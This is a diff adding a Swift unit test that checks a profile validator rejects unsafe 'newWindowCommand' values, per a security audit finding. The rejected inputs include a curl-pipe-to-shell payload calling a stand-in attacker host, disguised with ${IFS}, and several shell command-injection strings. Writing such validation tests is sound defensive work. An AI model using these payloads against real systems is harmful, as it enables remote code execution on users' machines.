@@ -212,4 +212,18 @@ final class ProfilesDocumentTests: XCTestCase {
         ])])
         XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: allowed))
     }
+
+    func testRejectsRestrictedNewWindowCommands() throws {
+        // Security audit C1: a remote profile may only plant {target} / open templates with plain flags.
+        let payload = #"/bin/sh -c curl${IFS}-fsSL${IFS}https://attacker.example/p|sh"#
+        for command in [payload, "/bin/sh -c id", "open -na {target}", "{target} $(id)", "{target} -n;id",
+                        "/usr/bin/open -na {target} --args --user-data-dir=/tmp/x"] {
+            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])]),
+                          with: .invalidField("apps.com.example.app.newWindowCommand"))
+        }
+        for command in ["/usr/bin/open -na {target} --args --new-window", "{target} --new-window"] {
+            let data = try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])])
+            XCTAssertEqual(try ProfilesDocument.decodeValidated(from: data).apps["com.example.app"]?.newWindowCommand, command)
+        }
+    }
 }
